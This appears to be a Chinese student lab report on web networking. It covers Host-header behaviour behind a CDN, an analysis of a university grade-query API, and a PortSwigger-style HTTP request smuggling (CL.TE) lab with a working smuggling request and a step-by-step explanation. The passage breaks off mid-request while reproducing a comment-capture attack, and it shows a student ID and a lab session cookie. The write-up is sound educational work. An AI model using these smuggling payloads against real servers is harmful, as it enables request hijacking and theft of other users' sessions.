+<h3 id="二这些地址是服务器的真实地址吗">二、这些地址是服务器的真实地址吗？<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#二这些地址是服务器的真实地址吗" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>这是一个很好的问题，答案是“是，但也不完全是”。</p>
+<ul>
+<li><strong>校内DNS返回的 <code>198.18.0.3</code></strong>：<strong>不是</strong>真实提供网页服务的服务器地址。它只是一个用于内部网络路由策略的“信标地址”。真正的Web服务器隐藏在VPN或校园网的内网深处。</li>
+<li><strong>公网DNS返回的 <code>122.225.214.239</code></strong>：<strong>是</strong>一台真实服务器的地址，但这台服务器是<strong>CDN的边缘节点服务器</strong>或<strong>反向代理服务器</strong>，而不是存放浙大网站源代码和数据的“源服务器”。它的作用是缓存网站内容，并就近提供给用户，为源服务器减轻压力。源服务器的真实IP被隐藏在CDN之后，不对公网直接暴露。</li>
+</ul>
+<h3 id="三现象原因分析问题出在哪一层">三、现象原因分析：问题出在哪一层？<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#三现象原因分析问题出在哪一层" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>这个问题的核心出在 <strong>应用层 (Application Layer)</strong>，具体来说是 <strong>HTTP协议</strong> 的工作机制。</p>
+<p>我们可以通过对比用“域名”和用“IP”访问时，浏览器发送的HTTP请求包来理解。</p>
+<h4 id="1-使用-域名-访问-httpwwwzjueducn">1. 使用 <strong>域名</strong> 访问 (<code>http://www.zju.edu.cn</code>)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-使用-域名-访问-httpwwwzjueducn" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>DNS将域名解析为IP后，浏览器向这个IP发起的HTTP请求包，其头部（Header）如下：</p>
+<p>![image-20250704134116876](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250704134116876.png)</p>
+<p>服务器（无论是CDN节点还是源站）收到请求后，它看到你想访问的是 <code>www.zju.edu.cn</code>，于是就知道应该把浙江大学主页的内容返回。</p>
+<h4 id="2-使用-ip地址-访问-http122225214239">2. 使用 <strong>IP地址</strong> 访问 (<code>http://122.225.214.239</code>)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-使用-ip地址-访问-http122225214239" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>在浏览器地址栏输入IP时，HTTP请求包的头部会变成这样：</p>
+<p>![image-20250704134224288](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250704134224288.png)</p>
+<p>服务器收到了这个请求，它查看 <code>Host</code> 字段，看到的是一个IP地址 <code>122.225.214.239</code>。</p>
+<p>现代的Web服务器普遍采用 <strong>虚拟主机 (Virtual Hosting)</strong> 技术，即一台服务器（一个IP地址）上可以托管成百上千个不同的网站。当服务器看到<code>Host</code>是IP地址时，它无法判断究竟想访问哪个网站（是 <code>www.zju.edu.cn</code> 还是这台服务器上托管的其他网站？）。在这种情况下，服务器通常会返回一个预先配置好的<strong>默认站点 (Default Site)</strong>，而这个默认站点通常就是一个欢迎页、错误页或空白页。</p>
+<p><strong>总结造成此现象的核心原因：</strong></p>
+<ol>
+<li><strong>应用层的虚拟主机技术</strong>：Web服务器依赖HTTP请求头中的 <code>Host</code> 字段来区分要提供哪个网站的服务。</li>
+<li><strong>IP地址无法提供网站身份信息</strong>：直接使用IP访问时，<code>Host</code> 字段无法提供具体的网站域名，导致服务器“不知道”你要访问哪个网站，只能返回默认页面。</li>
+</ol>
+<h3 id="总结">总结<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#总结" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>访问的地址</th><th>真实身份</th><th>为何直接访问是这个结果？</th></tr></thead><tbody><tr><td><strong><code>10.203.4.70</code></strong></td><td><strong>源服务器（或内网负载均衡器）</strong> 的真实IP</td><td>访问了正确的机器，但没提供域名(<code>Host</code>头)，服务器的默认规则是 <strong><code>403 Forbidden</code></strong>。</td></tr><tr><td><strong><code>198.18.0.3</code></strong></td><td><strong>VPN网关设备</strong> 的一个特殊地址</td><td>流量被VPN客户端导向了VPN网关，网关的默认页面被设置为 <strong>信息技术中心网站</strong>。</td></tr><tr><td><strong><code>122.225.214.239</code></strong></td><td><strong>CDN边缘节点服务器</strong> 的公网IP</td><td>访问了正确的CDN机器，但没提供域名(<code>Host</code>头)，CDN节点的默认规则是 <strong><code>403 Forbidden</code> (由Tengine驱动)</strong>。</td></tr></tbody></table></div>
+<h2 id="task2">task2<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#task2" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p><a href="https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?gnmkdm=N5083&amp;layout=default&amp;su=3230100127" class="external">https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html?gnmkdm=N5083&amp;layout=default&amp;su=3230100127<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></p>
+<p>在<code>Network</code>的请求列表中，可以看到页面加载的完整顺序。从上到下，大致遵循以下流程：</p>
+<ol>
+<li><strong>HTML文档请求</strong>：列表中的第一个请求是访问的 <code>.html</code> 文件。这是页面的基本骨架。	![image-20250702201245475](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250702201245475.png)</li>
+<li><strong>CSS样式文件加载</strong>：接下来，看到浏览器请求 <code>.css</code> 文件。这些文件决定了页面的外观，比如颜色、字体和布局。</li>
+<li><strong>JavaScript脚本加载</strong>：然后是大量的 <code>.js</code> 文件。这些是页面的“大脑”，负责页面的交互、动态功能，以及最重要的——<strong>发起后台请求去获取你的成绩数据</strong>。</li>
+<li><strong>图片等其他资源</strong>：最后，浏览器会加载图片（.png, .jpg）和字体（.woff）等其他资源。</li>
+<li><strong>数据请求 (XHR/Fetch)</strong>：这是我们要找的重点！当页面的基本框架和脚本加载完成后，脚本会向服务器发送一个“异步请求”来获取动态数据（比如你的成绩列表）。</li>
+</ol>
+<p><strong>小结：页面加载流程就是 浏览器先获取页面的框架和样式(HTML/CSS)，再加载功能脚本(JS)，最后由JS去后台拉取具体的数据并显示在页面上。</strong></p>
+<p>![image-20250702201436101](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250702201436101.png)</p>
+<p>![image-20250702202030573](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250702202030573.png)</p>
+<h3 id="api接口和参数分析">API接口和参数分析<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#api接口和参数分析" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<h4 id="1-api-端点-endpoint">1. API 端点 (Endpoint)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-api-端点-endpoint" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<ul>
+<li><strong>请求方法</strong>: <code>POST</code></li>
+<li><strong>URL</strong>:<code>https://zdbk.zju.edu.cn/jwglxt/cxdy/xscjcx_cxXscjIndex.html</code></li>
+</ul>
+<p>浏览器向这个地址发送了一个POST请求来获取数据。</p>
+<h4 id="2-请求参数-parameters">2. 请求参数 (Parameters)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-请求参数-parameters" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>参数分为三部分：URL查询参数、POST请求体中的表单参数和用于身份验证的Cookie。</p>
+<ul>
+<li><strong>URL查询参数 (Query String Parameters)</strong>:
+<ul>
+<li><code>doType=query</code>: 告诉服务器要执行的操作是“查询”。</li>
+<li><code>gnmkdm=N5083</code>: 指定了功能模块代码，代表“学生成绩查询”这个功能。</li>
+<li><code>su=3230100127</code>: 学号，用于指定查询对象。</li>
+</ul>
+</li>
+<li><strong>POST请求体参数 (Form Data)</strong>: <code>Content-Type</code>是<code>application/x-www-form-urlencoded</code>，并且<code>Content-Length</code>是<code>158</code>，这说明在POST请求的<strong>请求体 (Payload/Body)</strong> 中还携带了其他参数。这些参数通常是用来控制筛选和分页的。![image-20250702205433979](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250702205433979.png)</li>
+<li><strong>身份验证参数 (Authentication)</strong>:
+<ul>
+<li><code>Cookie: JSESSIONID=...; iPlanetDirectoryPro=...</code></li>
+<li>这是<strong>最关键的参数</strong>。服务器通过读取这个复杂的Cookie字符串来识别登录状态。没有这个Cookie，服务器会拒绝你的请求。</li>
+</ul>
+</li>
+</ul>
+<hr/>
+<h3 id="返回信息分析">返回信息分析<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#返回信息分析" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>服务器返回的是一个结构化的<code>JSON</code>对象，非常易于程序读取。</p>
+<h4 id="1-总体结构">1. 总体结构<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-总体结构" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<ul>
+<li><code>&quot;totalCount&quot;: 41</code>: 总共有41条成绩记录。</li>
+<li><code>&quot;totalPage&quot;: 3</code>: 根据每页显示的数量，计算出总共有3页数据。</li>
+<li><code>&quot;currentPage&quot;: 1</code>: 当前返回的是第1页的数据。</li>
+<li><code>&quot;items&quot;: [...]</code>: 这是一个数组，包含了当前页面所有的成绩项。</li>
+</ul>
+<h4 id="2-单条成绩记录-items-数组中的每个对象">2. 单条成绩记录 (<code>items</code> 数组中的每个对象)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-单条成绩记录-items-数组中的每个对象" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>我们来看第一条记录：</p>
+<pre><code>{
+    &quot;kcmc&quot;: &quot;军训&quot;,
+    &quot;cj&quot;: &quot;89&quot;,
+    &quot;jd&quot;: &quot;4.5&quot;,
+    &quot;xf&quot;: &quot;2.0&quot;,
+    &quot;xkkh&quot;: &quot;(2023-2024-1)-03110021-0022738-1&quot;
+}
+</code></pre>
+<ul>
+<li><code>&quot;kcmc&quot;</code>: <strong>课程名称</strong> (比如 “军训”)</li>
+<li><code>&quot;cj&quot;</code>: <strong>成绩</strong> (比如 “89”)</li>
+<li><code>&quot;jd&quot;</code>: <strong>绩点</strong> (比如 “4.5”)</li>
+<li><code>&quot;xf&quot;</code>: <strong>学分</strong> (比如 “2.0”)</li>
+<li><code>&quot;xkkh&quot;</code>: <strong>选课课号</strong>，这是一个唯一的课程标识，其中包含了学年学期信息 <code>(2023-2024-1)</code>。</li>
+</ul>
+<h3 id="结论与后续操作">结论与后续操作<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#结论与后续操作" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li><strong>页面加载流程</strong>: 页面首先加载HTML框架，然后通过JavaScript向 <code>...xscjcx_cxXscjIndex.html</code> 这个API接口发送一个携带了查询参数和身份Cookie的POST请求，获取到JSON格式的成绩数据，最后再将这些数据动态渲染成看到的表格。代码在task2/query.py</li>
+</ul>
+<p>![image-20250702203923458](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250702203923458.png)</p>
+<h2 id="task3">task3<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#task3" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="1-http-请求走私漏洞原理">1. HTTP 请求走私漏洞原理<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-http-请求走私漏洞原理" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>HTTP 请求走私（HTTP Request Smuggling）是一种攻击技术，它利用了 Web 应用架构中不同服务器（通常是前端代理/负载均衡服务器和后端应用服务器）对同一个模糊的 HTTP 请求报文解析方式的差异。</p>
+<p><strong>核心问题：边界模糊</strong></p>
+<p>标准的 HTTP/1.1 协议中，有两种方式来确定一个请求体（Request Body）的结束位置：</p>
+<ol>
+<li><code>Content-Length</code> (CL) 头：直接指定请求体的长度（以字节为单位）。</li>
+<li><code>Transfer-Encoding: chunked</code> (TE) 头：表示请求体是分块传输的，每块前面有其长度（十六进制），最后以一个大小为 0 的块 <code>0\r\n\r\n</code> 结尾。</li>
+</ol>
+<p>当一个 HTTP 请求同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 这两个头时，HTTP 规范 (RFC 2616) 指出应该忽略 <code>Content-Length</code>。然而，并非所有服务器都严格遵守这个规范。</p>
+<p>这就造成了不同服务器之间的解析不同步（Desynchronization）：</p>
+<ul>
+<li><strong>前端服务器</strong>：可能只认 <code>Content-Length</code>。它会读取 <code>Content-Length</code> 指定长度的字节，认为这是一个完整的请求，然后将其转发给后端。</li>
+<li><strong>后端服务器</strong>：可能优先处理 <code>Transfer-Encoding: chunked</code>。它会按照分块编码的规则来解析请求体，当它读到 <code>0\r\n\r\n</code> 时，就认为这个请求结束了。</li>
+</ul>
+<p><strong>CL.TE 型漏洞利用流程</strong></p>
+<p>在 CL.TE 漏洞场景中（前端认 CL，后端认 TE）：</p>
+<ol>
+<li><strong>攻击者构造一个恶意请求</strong>，其中同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code> 头。</li>
+<li><strong>前端服务器</strong> 收到请求后，遵循 <code>Content-Length</code>。它将整个（按照 <code>Content-Length</code> 计算的）报文体视为一个单一的数据块，然后原封不动地转发给后端。</li>
+<li><strong>后端服务器</strong> 收到请求后，遵循 <code>Transfer-Encoding: chunked</code>。它开始解析报文体，当解析到 <code>0\r\n\r\n</code> 时，它认为这个请求已经结束了。</li>
+<li><strong>“走私” 发生</strong>：如果 <code>Content-Length</code> 指定的长度大于 <code>0\r\n\r\n</code> 之前的内容长度，那么多出来的那部分数据就会被后端服务器遗留在 TCP 连接的缓冲区中。这部分数据，就是我们“走私”进去的内容。</li>
+<li><strong>毒化连接</strong>：当下一个正常用户的请求通过同一个 TCP 连接到达后端服务器时，被遗留在缓冲区的“走私数据”会被拼接到这个正常请求的<strong>最前面</strong>。</li>
+<li>后端服务器将 <code>走私数据 + 正常用户请求</code> 当作一个完整的请求来处理，从而导致非预期的行为，例如执行恶意操作、窃取用户会话、Cookie 等信息。</li>
+</ol>
+<p>实验操作</p>
+<p>选择根节点</p>
+<p>![image-20250703150742361](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703150742361.png)</p>
+<p>选择repeater</p>
+<p>降级http</p>
+<p>![image-20250703150912919](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703150912919.png)</p>
+<p>前提检查</p>
+<p>![image-20250703151212419](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703151212419.png)</p>
+<p>第一次</p>
+<p>![image-20250703151940394](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703151940394.png)</p>
+<p>第二次</p>
+<p>![image-20250703152000120](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703152000120.png)</p>
+<p>![image-20250703152211622](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250703152211622.png)</p>
+<p>这证明了前端和后端服务器之间存在解析不同步，并且成功地“毒化”了TCP连接，使下一个请求被破坏。我们研究一下这个具体过程</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="http" data-theme="github-light github-dark"><code data-language="http" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> YOUR-LAB-ID.web-security-academy.net</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Connection</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> keep-alive</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Type</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> application/x-www-form-urlencoded</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Length</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 6</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Transfer-Encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> chunked</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">0</span></span>
+<span data-line> </span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">G</span></span></code></pre></figure>
+<ol>
+<li><strong>到达前端服务器 (Proxy)</strong>
+<ul>
+<li>前端服务器看到 <code>Content-Length: 6</code> 这个头。</li>
+<li>于是，它从请求体（Body）中读取 <strong>6个字节</strong> 的内容。这6个字节是：
+<ul>
+<li><code>0</code> (1字节)</li>
+<li><code>\r\n</code> (回车换行, 2字节)</li>
+<li><code>\r\n</code> (回车换行, 2字节)</li>
+<li><code>G</code> (1字节)</li>
+</ul>
+</li>
+<li>对于前端服务器来说，这是一个包含了6字节数据的、完整的、单一的HTTP请求。它将这个请求原封不动地转发给后端服务器。</li>
+</ul>
+</li>
+<li><strong>到达后端服务器 (Application Server)</strong>
+<ul>
+<li>后端服务器收到了从前端转发过来的完整数据包。</li>
+<li>它看到了 <code>Transfer-Encoding: chunked</code> 这个头，并<strong>优先采用它</strong>来解析请求体。</li>
+<li>根据 <code>chunked</code> 编码规则，请求体由“长度块 + 数据块”组成，并以一个长度为0的块 <code>0\r\n\r\n</code> 结尾。</li>
+<li>后端服务器开始读取请求体，它读到了 <code>0\r\n\r\n</code>。</li>
+<li><strong>关键点</strong>：当后端服务器读到 <code>0\r\n\r\n</code> 时，它认为这个HTTP请求已经<strong>正常结束</strong>了。</li>
+<li>但是，前端服务器发过来的数据流里，在 <code>0\r\n\r\n</code> 之后还有一个字符 <code>G</code>。由于后端已经认为第一个请求结束了，它不会处理这个 <code>G</code>。这个 <code>G</code> 字符就被遗留在了TCP连接的缓冲区（input buffer）中。</li>
+</ul>
+</li>
+</ol>
+<p><strong>阶段一</strong>：成功地利用服务器之间的解析差异，向后端服务器的TCP连接缓冲区里“走私”并塞进了一个字符 <code>G</code>。</p>
+<h4 id="阶段二下一个请求受害者请求"><strong>阶段二：下一个请求（受害者请求）</strong><a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#阶段二下一个请求受害者请求" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<ol>
+<li>
+<p><strong>发送了第二个请求</strong></p>
+<ul>
+<li>这是再次点击Burp Repeater的”Send”按钮完成的。这个请求可以是一个 <code>POST</code> 或 <code>GET</code> 请求。又发送了一个 <code>POST</code> 请求。</li>
+</ul>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="http" data-theme="github-light github-dark"><code data-language="http" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> YOUR-LAB-ID.web-security-academy.net</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">...</span></span></code></pre></figure>
+</li>
+<li>
+<p><strong>后端服务器处理新请求</strong></p>
+<ul>
+<li>这个新的 <code>POST</code> 请求通过前端，到达了刚刚被你“毒化”的那个TCP连接上。</li>
+<li>后端服务器准备从缓冲区读取新的请求数据。但它首先读到的是什么？是上一轮被遗留下来的那个 <code>G</code></li>
+<li>然后，它才读到你新发送的请求 <code>POST / HTTP/1.1...</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>请求碰撞与错误</strong></p>
+<ul>
+<li>后端服务器将缓冲区中的数据拼接起来，试图将其解析为一个HTTP请求。它看到的内容是：</li>
+</ul>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="http" data-theme="github-light github-dark"><code data-language="http" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">GPOST / HTTP/1.1</span></span>
+<span data-line><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">...</span></span></code></pre></figure>
+<ul>
+<li>服务器在解析请求行 <code>GPOST / HTTP/1.1</code> 时无法识别。HTTP协议里没有叫 <code>GPOST</code> 的方法（合法的有 GET, POST, PUT, DELETE 等）。</li>
+<li>因此，服务器无法识别这个方法，只能返回一个错误信息，也就是看到的：<code>Unrecognized method GPOST</code>。</li>
+</ul>
+</li>
+</ol>
+<h4 id="帖子评论漏洞复现">帖子评论漏洞复现<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#帖子评论漏洞复现" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
+<p>自己发一个评论，把post请求send到reapeter</p>
+<p>![image-20250716223947246](/Users/kaisenye/Library/Application Support/typora-user-images/image-20250716223947246.png)</p>
+<h5 id="复现步骤">复现步骤<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#复现步骤" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
+<pre><code>POST /post/comment HTTP/1.1
+Host: 0a7b00a70354238e80186777001600fe.web-security-academy.net
+Cookie: session=TlR4dPRlOnv8IfN5Fr1SCJ6KYfAuU9LG
+Content-Length: 189
+Cache-Control: max-age=0
+Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;macOS&quot;
+Accept-Language: zh-CN,zh;q=0.9
+Origin: https://0a7b00a70354238e80186777001600fe.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
